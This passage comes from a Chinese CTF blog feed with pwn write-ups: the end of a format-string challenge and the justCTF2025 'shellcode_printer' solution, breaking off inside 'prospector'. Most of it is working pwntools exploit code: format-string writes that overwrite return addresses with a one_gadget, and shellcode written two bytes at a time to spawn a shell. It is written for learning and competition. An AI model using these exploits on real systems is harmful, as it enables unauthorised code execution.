0x7ffd2d48c898 然后再通过 0x7ffd2d48c890 修改 0x7ffd2d48c898 —▸ 0x6201a8227233（考虑到后续栈利用所以不返回 0x6201a822722E）。</p><p>但是如果实践过就会发现这样的连续修改是不成立的，也就是第二次修改会不成功。详见：<a href="https://bbs.kanxue.com/thread-281920.htm#msg_header_h2_9">看雪学院</a> 这位大佬的文章的 4.连打不成立的原理 。</p><p>但是这并不意味着我们不能修改正在被修改的地址 0x7ffd2d48c890 。通过调试我们发现在使用如下 payload 会失败：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;%&quot;</span> + stre(str1) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%24$hhn&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(str2) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%26$hhn&quot;</span><br></code></pre></td></tr></table></figure><p>而使用这个 payload 会成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;%c&quot;</span>*<span class="hljs-number">22</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(str1) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%hhn&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(str2) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%26$hhn&quot;</span><br></code></pre></td></tr></table></figure><p>他们的区别在于一个是成功的那个只使用了一次的 $ 来偏移，而原本 %24$ 的位置则是通过 22 个 %c 滑行过去的。</p><p>知道了这一点下面就好办了，再给成功的 pyload 加一点暴露地址的功能，等我们回到 vuln 函数以后打一个 one_gadget 就能 getshell 。</p><p>由于存在 pie 所以 vuln 的地址需要爆破，所以打通的概率为十六分之一。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-comment">#loadsym = &quot;loadsym ./libc.so.6.debug ./ld.debug /home/zlsf/LS/glibc-2.23\n&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    str1 = <span class="hljs-number">0x8a</span> + <span class="hljs-number">0x48</span><br>    str2 = str1 + <span class="hljs-number">0x79</span><br><br>    payload = <span class="hljs-string">b&quot;%c&quot;</span>*<span class="hljs-number">22</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(str1) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%hhn&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(str2) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%26$hhn&quot;</span><br>    payload+= <span class="hljs-string">b&quot;-%29$p-%27$p-%31$p-&quot;</span><br>    sea(<span class="hljs-string">b&quot;!\n&quot;</span>, payload)<br><br>    reu(<span class="hljs-string">b&quot;-&quot;</span>)<br>    libc_base = raddr_A() - <span class="hljs-number">0x2a1ca</span>   <br>    pie_addr = raddr_A() - <span class="hljs-number">0x12ea</span><br>    stack_addr = raddr_A() - <span class="hljs-number">0x1d8</span> + <span class="hljs-number">0xb8</span><br>    stack_one = stack_addr - <span class="hljs-number">0x68</span> + <span class="hljs-number">0x98</span><br>    ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>    ph(pie_addr,<span class="hljs-string">&quot;pie_addr&quot;</span>)<br>    ph(stack_addr,<span class="hljs-string">&quot;stack_addr&quot;</span>)<br><br>    one = libc_base + <span class="hljs-number">0xef52b</span><br>    ph(one,<span class="hljs-string">&quot;one&quot;</span>)<br><br>    str0 = stack_one &amp; <span class="hljs-number">0xFF</span><br>    str1 = (one &amp; <span class="hljs-number">0xFF</span>) - str0<br>    str2 = ((one&gt;&gt;<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFFFF</span>) - str0 - str1<br><br>    payload = <span class="hljs-string">b&quot;%&quot;</span> + stre(str0) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(<span class="hljs-number">14</span>) + <span class="hljs-string">b&quot;$hhn&quot;</span> <br>    payload+= <span class="hljs-string">b&quot;%&quot;</span> + stre(str1) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(<span class="hljs-number">13</span>) + <span class="hljs-string">b&quot;$hhn&quot;</span><br>    payload+= <span class="hljs-string">b&quot;%&quot;</span> + stre(str2) + <span class="hljs-string">b&quot;c&quot;</span> + <span class="hljs-string">b&quot;%&quot;</span> + stre(<span class="hljs-number">15</span>) + <span class="hljs-string">b&quot;$hn&quot;</span><br>    payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&quot;A&quot;</span>)<br>    payload+= p64(stack_addr) + p64(stack_addr-<span class="hljs-number">0x8</span>) + p64(stack_addr+<span class="hljs-number">1</span>)<br><br>    sleep(<span class="hljs-number">0.1</span>)<br>    se(payload)<br><br>    op()<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>        exp()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        cp()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>justCTF2025-Pwn部分WP</title>
    <link href="/2025/08/07/justCTF2025-Pwn%E9%83%A8%E5%88%86WP/"/>
    <url>/2025/08/07/justCTF2025-Pwn%E9%83%A8%E5%88%86WP/</url>
    
    <content type="html"><![CDATA[<hr><p>附件下载：<a href="https://z-l-s-f.lanzouq.com/iZQWK32uvh7g">https://z-l-s-f.lanzouq.com/iZQWK32uvh7g</a></p><hr><h3 id="shellcode-printer"><a href="#shellcode-printer" class="headerlink" title="shellcode_printer"></a>shellcode_printer</h3><p>check:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">[*] <span class="hljs-string">&#x27;/home/zlsf/start/mypwn/just2025_01-20250806/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  _BYTE *addr; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">size_t</span> len; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  len = getpagesize();<br>  addr = mmap(<span class="hljs-number">0LL</span>, len, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( addr == (_BYTE *)<span class="hljs-number">-1LL</span> )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>LABEL_12:<br>    munmap(addr, len);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  &#125;<br>  stream = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;fopen&quot;</span>);<br>LABEL_11:<br>    fclose(stream);<br>    <span class="hljs-keyword">goto</span> LABEL_12;<br>  &#125;<br>  *addr = <span class="hljs-number">-61</span>;<br>  <span class="hljs-keyword">for</span> ( addr -= <span class="hljs-number">2</span>; ; addr += <span class="hljs-number">2</span> )<br>  &#123;<br>    *(_QWORD *)s = <span class="hljs-number">0LL</span>;<br>    v8 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a format string: &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !fgets(s, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>) )<br>    &#123;<br>      perror(<span class="hljs-string">&quot;fgets&quot;</span>);<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    &#125;<br>    s[<span class="hljs-built_in">strcspn</span>(s, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !s[<span class="hljs-number">0</span>] )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">fprintf</span>(stream, s);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ((__int64 (*)(<span class="hljs-type">void</span>))addr)();<br>&#125;<br></code></pre></td></tr></table></figure><p>通过ida分析我们不难发现程序先是mmap一块可读可写可执行的区域给到addr，最后程序会执行addr中的shellcode。程序通过stream打开了一个“黑洞文件”，并且进入循环将我们的输入利用fprinf写入这个文件，而漏洞点在于fprintf和printf一样具有字符串格式化漏洞，在addr每次循环后会自加2的情况下我们可以通过字格的%c和%hn一次性向addr区域写入2字节的shellcode，我们可以在addr区域写一个read调用后再写入完整的shellcode。</p><p>由于每次写入后addr都会自增2，所以返回时执行的是我们最后写入的那两个字节的shellocde，我们可以使用jmp loop（\xee\xfe）的短跳来实现rip回到addr的起始地址完成read的调用。</p><p>当程序执行到read的shellcode时我们的rsi正好设置的是syscall的下一个地址此时可以完成shellcode的续写。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&quot;shellcode-printer.nc.jctf.pro&quot;, 1337)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-comment">#loadsym = &quot;loadsym ./libc.so.6.debug ./ld.debug /home/zlsf/LS/glibc-2.23\n&quot;</span><br><br>payload = <span class="hljs-string">b&quot;%12616c%6$hn&quot;</span><br>gdbp(p,<span class="hljs-string">&quot;b *$rebase(0x13B2)&quot;</span>)<br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%18687c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%54921c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%35148c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%37082c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%1295c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>payload = <span class="hljs-string">b&quot;%62187c%6$hn&quot;</span><br>sela(<span class="hljs-string">b&quot;: &quot;</span>,payload)<br>sela(<span class="hljs-string">b&quot;: &quot;</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = asm(shellcraft.sh())<br>se(payload)<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="prospector"><a href="#prospector" class="headerlink" title="prospector"></a>prospector</h3><p>libc版本：Ubuntu GLIBC 2.41-6ubuntu1.1</p><p>check:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">[!] Did not find any GOT entries<br>[*] <span class="hljs-string">&#x27;/home/zlsf/start/mypwn/just2025_02-20250806/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br></code></pre></td></tr></table></figure><p>ida:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">sub_10FD</span><span class="hljs-params">(__int64 a1, _QWORD *a2)</span><br>&#123;<br>  __int64 v3[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">memset</span>(v3, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>  v4 = sub_15CC(a1, <span class="hljs-number">224LL</span>);<br>  sub_1786(v4, <span class="hljs-number">0LL</span>, <span class="hljs-number">224LL</span>);<br>  <span 